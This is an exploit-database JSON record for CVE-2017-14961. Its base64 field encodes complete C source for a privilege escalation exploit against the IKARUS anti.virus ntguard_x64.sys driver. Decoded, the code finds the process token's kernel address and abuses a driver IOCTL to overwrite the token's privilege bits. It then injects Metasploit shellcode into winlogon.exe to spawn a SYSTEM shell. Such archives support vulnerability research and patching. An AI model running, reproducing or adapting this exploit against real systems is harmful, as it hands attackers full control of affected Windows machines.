{
    "source": "exploit-database", 
    "exploit": "LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIElLQVJVUyBhbnRpLnZpcnVzIEFyYml0cmFyeSBXcml0ZSBQcml2aWxlZ2UgRXNjYWxhdGlvbg0KRGF0ZSAgICAgICAgICAgICAtIDEzdGggTm92ZW1iZXIgMjAxNw0KRGlzY292ZXJlZCBieSAgICAtIFBhcnZleiBBbndhciAoQHBhcnZlemdoaCkNClZlbmRvciBIb21lcGFnZSAgLSBodHRwczovL3d3dy5pa2FydXNzZWN1cml0eS5jb20vDQpUZXN0ZWQgVmVyc2lvbiAgIC0gMi4xNi43DQpEcml2ZXIgVmVyc2lvbiAgIC0gMC4xODc4MC4wLjAgLSBudGd1YXJkX3g2NC5zeXMNClRlc3RlZCBvbiBPUyAgICAgLSA2NGJpdCBXaW5kb3dzIDcgYW5kIFdpbmRvd3MgMTAgKDE3MDkpIA0KQ1ZFIElEICAgICAgICAgICAtIENWRS0yMDE3LTE0OTYxDQpWZW5kb3IgZml4IHVybCAgIC0gU29vbiB0byBiZSByZWxlYXNlZA0KRml4ZWQgVmVyc2lvbiAgICAtIDIuMTYuMTgNCkZpeGVkIGRyaXZlciB2ZXIgLSAwLjQzLjAuMA0KDQoNCkNoZWNrIGJsb2dwb3N0IGZvciBkZXRhaWxzOg0KDQpodHRwczovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD05OTUNCg0KKi8NCg0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx3aW5kb3dzLmg+DQojaW5jbHVkZSA8VGxIZWxwMzIuaD4NCg0KI3ByYWdtYSBjb21tZW50KGxpYiwiYWR2YXBpMzIubGliIikNCg0KI2RlZmluZSBTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiAxNg0KI2RlZmluZSBTVEFUVVNfSU5GT19MRU5HVEhfTUlTTUFUQ0ggKChOVFNUQVRVUykweGMwMDAwMDA0TCkNCg0KDQp0eXBlZGVmIHVuc2lnbmVkIF9faW50NjQgUVdPUkQ7DQoNCg0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTw0Kew0KICAgICBVTE9ORyAgICAgICBQcm9jZXNzSWQ7DQogICAgIFVDSEFSICAgICAgIE9iamVjdFR5cGVOdW1iZXI7DQogICAgIFVDSEFSICAgICAgIEZsYWdzOw0KICAgICBVU0hPUlQgICAgICBIYW5kbGU7DQogICAgIFFXT1JEICAgICAgIE9iamVjdDsNCiAgICAgQUNDRVNTX01BU0sgR3JhbnRlZEFjY2VzczsNCn0gU1lTVEVNX0hBTkRMRSwgKlBTWVNURU1fSEFORExFOw0KDQoNCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fSEFORExFX0lORk9STUFUSU9OIA0Kew0KICAgICBVTE9ORyBOdW1iZXJPZkhhbmRsZXM7DQogICAgIFNZU1RFTV9IQU5ETEUgSGFuZGxlc1sxXTsNCn0gU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTiwgKlBTWVNURU1fSEFORExFX0lORk9STUFUSU9OOw0KDQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikoDQogICAgIFVMT05HIFN5c3RlbUluZm9ybWF0aW9uQ2xhc3MsDQogICAgIFBWT0lEIFN5c3RlbUluZm9ybWF0aW9uLA0KICAgICBVTE9ORyBTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aCwNCiAgICAgUFVMT05HIFJldHVybkxlbmd0aCk7DQoNCg0KDQoNCkRXT1JEIGdldFByb2Nlc3NJZChjaGFyKiBwcm9jZXNzKQ0Kew0KICAgICBIQU5ETEUgICAgICAgICAgaFNuYXBTaG90Ow0KICAgICBQUk9DRVNTRU5UUlkzMiAgcGUzMjsNCiAgICAgRFdPUkQgICAgICAgICAgIHBpZDsNCg0KDQogICAgIGhTbmFwU2hvdCA9IENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdChUSDMyQ1NfU05BUFBST0NFU1MsIDApOw0KDQogICAgIGlmIChoU25hcFNob3QgPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpIA0KICAgICB7DQogICAgICAgICBwcmludGYoIgpbLV0gRmFpbGVkIHRvIGNyZWF0ZSBoYW5kbGUgQ3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90KCkKCiIpOw0KICAgICAgICAgcmV0dXJuIC0xOw0KICAgICB9IA0KDQogICAgIHBlMzIuZHdTaXplID0gc2l6ZW9mKFBST0NFU1NFTlRSWTMyKTsNCg0KICAgICBpZiAoUHJvY2VzczMyRmlyc3QoaFNuYXBTaG90LCAmcGUzMikgPT0gRkFMU0UpDQogICAgIHsNCiAgICAgICAgIHByaW50ZigiClstXSBGYWlsZWQgdG8gY2FsbCBQcm9jZXNzMzJGaXJzdCgpCgoiKTsNCiAgICAgICAgIHJldHVybiAtMTsNCiAgICAgfQ0KICAgICAgICANCiAgICAgZG8NCiAgICAgew0KICAgICAgICAgaWYgKHN0cmljbXAocGUzMi5zekV4ZUZpbGUsIHByb2Nlc3MpID09IDApDQogICAgICAgICB7DQogICAgICAgICAgICAgcGlkID0gcGUzMi50aDMyUHJvY2Vzc0lEOw0KICAgICAgICAgICAgIHJldHVybiBwaWQ7DQogICAgICAgICB9DQogICAgIH0gd2hpbGUgKFByb2Nlc3MzMk5leHQoaFNuYXBTaG90LCAmcGUzMikpOw0KDQogICAgIENsb3NlSGFuZGxlKGhTbmFwU2hvdCk7DQogICAgIHJldHVybiAwOw0KfQ0KDQoNCmludCBzcGF3blNoZWxsKCkNCnsNCi8vIHdpbmRvd3MveDY0L2V4ZWMgLSAyNzUgYnl0ZXMgaHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbQ0KLy8gVkVSQk9TRT1mYWxzZSwgUHJlcGVuZE1pZ3JhdGU9ZmFsc2UsIEVYSVRGVU5DPXRocmVhZCwgQ01EPWNtZC5leGUNCg0KICAgICBjaGFyIHNoZWxsY29kZVtdID0NCiAgICAgIvxIg+Tw6MAAAABBUUFQIiANCiAgICAgIlJRVkgx0mVIi1JgSItSIiANCiAgICAgIhhIi1IgSItyUEgPt0pKIiANCiAgICAgIk0xyUgxwKw8YXwCLCBBIiANCiAgICAgIsHJDUEBweLtUkFRSItSIiANCiAgICAgIiCLQjxIAdCLgIgAAABIIiANCiAgICAgIoXAdGdIAdBQi0gYRItAIiANCiAgICAgIiBJAdDjVkj/yUGLNIhIIiANCiAgICAgIgHWTTHJSDHArEHByQ1BIiANCiAgICAgIgHBOOB18UwDTCQIRTnRIiANCiAgICAgInXYWESLQCRJAdBmQYsMIiANCiAgICAgIkhEi0AcSQHQQYsEiEgBIiANCiAgICAgItBBWEFYXllaQVhBWUFaIiANCiAgICAgIkiD7CBBUv/gWEFZWkiLIiANCiAgICAgIhLpV////11IugEAAAAAIiANCiAgICAgIgAAAEiNjQEBAABBujGLIiANCiAgICAgIm+H/9W74B0qCkG6ppW9IiANCiAgICAgIp3/1UiDxCg8BnwKgPvgIiANCiAgICAgInUFu0cTcm9qAFlBidr/IiANCiAgICAgItVjbWQuZXhlACI7DQoNCiAgICAgY2hhciogICAgIHByb2Nlc3MgPSAid2lubG9nb24uZXhlIjsNCiAgICAgRFdPUkQgICAgIHBpZDsNCiAgICAgSEFORExFICAgIGhQcm9jZXNzOw0KICAgICBIQU5ETEUgICAgaFRocmVhZDsNCiAgICAgTFBWT0lEICAgIHB0cnRvbWVtOw0KDQoNCiAgICAgcGlkID0gZ2V0UHJvY2Vzc0lkKHByb2Nlc3MpOw0KDQogICAgIGlmICgoaFByb2Nlc3MgPSBPcGVuUHJvY2VzcyhQUk9DRVNTX0FMTF9BQ0NFU1MsIEZBTFNFLCBwaWQpKSA9PSBOVUxMKQ0KICAgICB7DQogICAgICAgICBwcmludGYoIgpbLV0gVW5hYmxlIHRvIG9wZW4gJXMgcHJvY2VzcwoKIiwgcHJvY2Vzcyk7DQogICAgICAgICByZXR1cm4gLTE7DQogICAgIH0NCiAgICAgcHJpbnRmKCIKWytdIE9wZW5lZCAlcyBwcm9jZXNzIHBpZD0lZCB3aXRoIFBST0NFU1NfQUxMX0FDQ0VTUyByaWdodHMiLCBwcm9jZXNzLCBwaWQpOw0KDQogICAgIGlmICgocHRydG9tZW0gPSBWaXJ0dWFsQWxsb2NFeChoUHJvY2VzcywgTlVMTCwgMHgxMDAwLCBNRU1fUkVTRVJWRSB8IE1FTV9DT01NSVQsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpKSA9PSBOVUxMKQ0KICAgICB7DQogICAgICAgICBwcmludGYoIgpbLV0gVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0YXJnZXQgcHJvY2VzcwoKIik7DQogICAgICAgICByZXR1cm4gLTE7DQogICAgIH0NCiAgICAgcHJpbnRmKCIKWytdIE1lbW9yeSBhbGxvY2F0ZWQgYXQgYWRkcmVzcyAweCVwIiwgcHRydG9tZW0pOw0KDQogICAgIGlmICghKFdyaXRlUHJvY2Vzc01lbW9yeShoUHJvY2VzcywgKExQVk9JRClwdHJ0b21lbSwgc2hlbGxjb2RlLCBzaXplb2Yoc2hlbGxjb2RlKSwgTlVMTCkpKQ0KICAgICB7DQogICAgICAgICBwcmludGYoIgpbLV0gVW5hYmxlIHRvIHdyaXRlIHRvIHByb2Nlc3MgbWVtb3J5CgoiKTsNCiAgICAgICAgIHJldHVybiAtMTsNCiAgICAgfQ0KICAgICBwcmludGYoIgpbK10gV3JpdHRlbiB0byBhbGxvY2F0ZWQgcHJvY2VzcyBtZW1vcnkiKTsNCiANCiAgICAgaWYgKChoVGhyZWFkID0gQ3JlYXRlUmVtb3RlVGhyZWFkKGhQcm9jZXNzLCBOVUxMLCAwLCAoTFBUSFJFQURfU1RBUlRfUk9VVElORSlwdHJ0b21lbSwgTlVMTCwgMCwgTlVMTCkpID09IE5VTEwpDQogICAgIHsNCiAgICAgICAgIENsb3NlSGFuZGxlKGhUaHJlYWQpOw0KICAgICAgICAgcHJpbnRmKCIKWy1dIFVuYWJsZSB0byBjcmVhdGUgcmVtb3RlIHRocmVhZAoKIik7DQogICAgICAgICByZXR1cm4gLTE7DQogICAgIH0NCiAgICAgcHJpbnRmKCIKWytdIENyZWF0ZWQgcmVtb3RlIHRocmVhZCBhbmQgZXhlY3V0ZWQKCiIpOyAgIA0KDQogICAgIHJldHVybiAwOw0KfQ0KDQoNCg0KUVdPUkQgVG9rZW5BZGRyZXNzQ3VycmVudFByb2Nlc3MoSEFORExFIGhQcm9jZXNzLCBEV09SRCBNeVByb2Nlc3NJRCkgDQp7DQogICAgX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiAgIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbjsNCiAgICBQU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTiAgcFN5c0hhbmRsZUluZm87IA0KICAgIFVMT05HICAgICAgICAgICAgICAgICAgICAgICBpOw0KICAgIFBTWVNURU1fSEFORExFICAgICAgICAgICAgICBwSGFuZGxlOw0KICAgIFFXT1JEICAgICAgICAgICAgICAgICAgICAgICBUb2tlbkFkZHJlc3MgPSAwOyAgICAgICANCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgblNpemUgPSA0MDk2Ow0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICBuUmV0dXJuOyANCiAgICBCT09MICAgICAgICAgICAgICAgICAgICAgICAgdFByb2Nlc3M7ICAgIA0KICAgIEhBTkRMRSAgICAgICAgICAgICAgICAgICAgICBoVG9rZW47DQoNCg0KICAgIGlmICgodFByb2Nlc3MgPSBPcGVuUHJvY2Vzc1Rva2VuKGhQcm9jZXNzLCBUT0tFTl9RVUVSWSwgJmhUb2tlbikpID09IEZBTFNFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIKWy1dIE9wZW5Qcm9jZXNzVG9rZW4oKSBmYWlsZWQgKCVkKQoiLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSAoX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbilHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQogCQ0KICAgIGlmICghTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVW5hYmxlIHRvIHJlc29sdmUgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uCgoiKTsNCiAgICAgICAgcmV0dXJuIC0xOyAgDQogICAgfQ0KDQogICAgZG8NCiAgICB7ICANCiAgICAgICAgblNpemUgKz0gNDA5NjsNCiAgICAgICAgcFN5c0hhbmRsZUluZm8gPSAoUFNZU1RFTV9IQU5ETEVfSU5GT1JNQVRJT04pIEhlYXBBbGxvYyhHZXRQcm9jZXNzSGVhcCgpLCAwLCBuU2l6ZSk7IA0KICAgIH0gd2hpbGUgKE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiwgcFN5c0hhbmRsZUluZm8sIG5TaXplLCAmblJldHVybikgPT0gU1RBVFVTX0lORk9fTEVOR1RIX01JU01BVENIKTsNCgkNCiAgICBwcmludGYoIgpbaV0gQ3VycmVudCBwcm9jZXNzIGlkICVkIGFuZCB0b2tlbiBoYW5kbGUgdmFsdWUgJXUiLCBNeVByb2Nlc3NJRCwgaFRva2VuKTsJDQoNCiAgICBmb3IgKGkgPSAwOyBpIDwgcFN5c0hhbmRsZUluZm8tPk51bWJlck9mSGFuZGxlczsgaSsrKSANCiAgICB7DQoNCiAgICAgICAgaWYgKHBTeXNIYW5kbGVJbmZvLT5IYW5kbGVzW2ldLlByb2Nlc3NJZCA9PSBNeVByb2Nlc3NJRCAmJiBwU3lzSGFuZGxlSW5mby0+SGFuZGxlc1tpXS5IYW5kbGUgPT0gaFRva2VuKSANCiAgICAgICAgew0KICAgICAgICAgICAgVG9rZW5BZGRyZXNzID0gcFN5c0hhbmRsZUluZm8tPkhhbmRsZXNbaV0uT2JqZWN0OwkgICAgIAkJCSAgDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBIZWFwRnJlZShHZXRQcm9jZXNzSGVhcCgpLCAwLCBwU3lzSGFuZGxlSW5mbyk7DQogICAgcmV0dXJuIFRva2VuQWRkcmVzczsJDQp9DQoNCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSANCnsNCg0KICAgIFFXT1JEICAgICAgVG9rZW5BZGRyZXNzVGFyZ2V0OyANCiAgICBRV09SRCAgICAgIFNlcFByaXZpbGVnZXNPZmZzZXQgPSAweDQwOw0KICAgIFFXT1JEICAgICAgUHJlc2VudEJ5dGVPZmZzZXQ7DQogICAgUVdPUkQgICAgICBFbmFibGVCeXRlT2Zmc2V0Ow0KICAgIFFXT1JEICAgICAgVG9rZW5BZGRyZXNzOw0KICAgIEhBTkRMRSAgICAgaERldmljZTsNCiAgICBjaGFyICAgICAgIGRldmhhbmRsZVtNQVhfUEFUSF07DQogICAgRFdPUkQgICAgICBkd1JldEJ5dGVzID0gMDsgICAgICAgICAgICAgDQoNCg0KICAgIHByaW50ZigiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoiKTsNCiAgICBwcmludGYoIiAgICAgICAgSUtBUlVTIGFudGkudmlydXMgKG50Z3VhcmRfeDY0LnN5cykgQXJiaXRyYXJ5IFdyaXRlIEVvUCBFeHBsb2l0ICAgICAgICAKIik7DQogICAgcHJpbnRmKCIgICAgICAgICAgICAgICAgIFRlc3RlZCBvbiA2NGJpdCBXaW5kb3dzIDcgLyBXaW5kb3dzIDEwICgxNzA5KSAgICAgICAgICAgICAgICAgCiIpOw0KICAgIHByaW50ZigiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoiKTsNCg0KICAgIFRva2VuQWRkcmVzcyA9IFRva2VuQWRkcmVzc0N1cnJlbnRQcm9jZXNzKEdldEN1cnJlbnRQcm9jZXNzKCksIEdldEN1cnJlbnRQcm9jZXNzSWQoKSk7DQogICAgcHJpbnRmKCIKW2ldIEFkZHJlc3Mgb2YgY3VycmVudCBwcm9jZXNzIHRva2VuIDB4JXAiLCBUb2tlbkFkZHJlc3MpOw0KDQogICAgVG9rZW5BZGRyZXNzVGFyZ2V0ID0gVG9rZW5BZGRyZXNzICsgU2VwUHJpdmlsZWdlc09mZnNldDsNCiAgICBwcmludGYoIgpbaV0gQWRkcmVzcyBvZiBfU0VQX1RPS0VOX1BSSVZJTEVHRVMgMHglcCB3aWxsIGJlIG92ZXJ3cml0dGVuCiIsIFRva2VuQWRkcmVzc1RhcmdldCk7DQoNCiAgICBQcmVzZW50Qnl0ZU9mZnNldCA9IFRva2VuQWRkcmVzc1RhcmdldCArIDB4MjsNCiAgICBwcmludGYoIltpXSBQcmVzZW50IGJpdHMgYXQgMHglcCB3aWxsIGJlIG92ZXJ3cml0dGVuIHdpdGggMHgxMQoiLCBQcmVzZW50Qnl0ZU9mZnNldCk7DQoNCiAgICBFbmFibGVCeXRlT2Zmc2V0ID0gVG9rZW5BZGRyZXNzVGFyZ2V0ICsgMHhhOw0KICAgIHByaW50ZigiW2ldIEVuYWJsZWQgYml0cyBhdCAweCVwIHdpbGwgYmUgb3ZlcndyaXR0ZW4gd2l0aCAweDExIiwgRW5hYmxlQnl0ZU9mZnNldCk7DQoNCiAgICBzcHJpbnRmKGRldmhhbmRsZSwgIlxcLlwlcyIsICJudGd1YXJkIik7DQoNCiAgICBoRGV2aWNlID0gQ3JlYXRlRmlsZShkZXZoYW5kbGUsIEdFTkVSSUNfUkVBRCB8IEdFTkVSSUNfV1JJVEUsIEZJTEVfU0hBUkVfUkVBRCB8IEZJTEVfU0hBUkVfV1JJVEUsIE5VTEwsIE9QRU5fRVhJU1RJTkcgLCAwLCBOVUxMKTsNCiAgICANCiAgICBpZihoRGV2aWNlID09IElOVkFMSURfSEFORExFX1ZBTFVFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIKWy1dIE9wZW4gJXMgZGV2aWNlIGZhaWxlZAoKIiwgZGV2aGFuZGxlKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIKWytdIE9wZW4gJXMgZGV2aWNlIHN1Y2Nlc3NmdWwiLCBkZXZoYW5kbGUpOw0KICAgIH0JDQoNCiAgICBwcmludGYoIgpbfl0gUHJlc3MgYW55IGtleSB0byBjb250aW51ZSAuIC4gLgoiKTsNCiAgICBnZXRjaCgpOw0KDQogICAgRGV2aWNlSW9Db250cm9sKGhEZXZpY2UsIDB4ODMwMDAwMGMsIE5VTEwsIDAsIChMUFZPSUQpUHJlc2VudEJ5dGVPZmZzZXQsIDAsICZkd1JldEJ5dGVzLCBOVUxMKTsNCiAgICBEZXZpY2VJb0NvbnRyb2woaERldmljZSwgMHg4MzAwMDAwYywgTlVMTCwgMCwgKExQVk9JRClFbmFibGVCeXRlT2Zmc2V0LCAwLCAmZHdSZXRCeXRlcywgTlVMTCk7DQoNCiAgICBwcmludGYoIlsrXSBPdmVyd3JpdHRlbiBfU0VQX1RPS0VOX1BSSVZJTEVHRVMgYml0cwoiKTsNCiAgICBDbG9zZUhhbmRsZShoRGV2aWNlKTsNCg0KICAgIHByaW50ZigiWypdIFNwYXduaW5nIFNZU1RFTSBTaGVsbCIpOw0KICAgIHNwYXduU2hlbGwoKTsNCg0KICAgIHJldHVybiAwOw0KfQ==", 
    "id": "43139", 
    "cves": [
        "CVE-2017-14961"
    ]
}